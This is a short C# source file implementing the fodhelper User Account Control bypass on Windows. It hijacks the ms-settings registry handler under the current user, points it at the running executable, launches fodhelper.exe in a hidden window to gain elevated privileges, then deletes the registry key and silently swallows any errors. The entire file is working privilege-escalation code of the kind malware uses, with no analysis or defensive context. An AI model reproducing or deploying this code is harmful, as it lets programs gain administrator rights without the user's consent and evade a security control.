using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Threading;

public static class UACBypass
{
    public static void Start()
    {
        try
        {
            
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            
            string regPath = @"Software\Classes\ms-settings\shell\open\command";

            
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
            {
                key.SetValue("", "\"" + exePath + "\"");
                key.SetValue("DelegateExecute", ""); 
            }

            
            Process.Start(new ProcessStartInfo
            {
                FileName = "fodhelper.exe",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });

           
            Thread.Sleep(2000);
            Registry.CurrentUser.DeleteSubKeyTree(regPath);
        }
        catch
        {
            
        }
    }
}
//fod helper uac bypass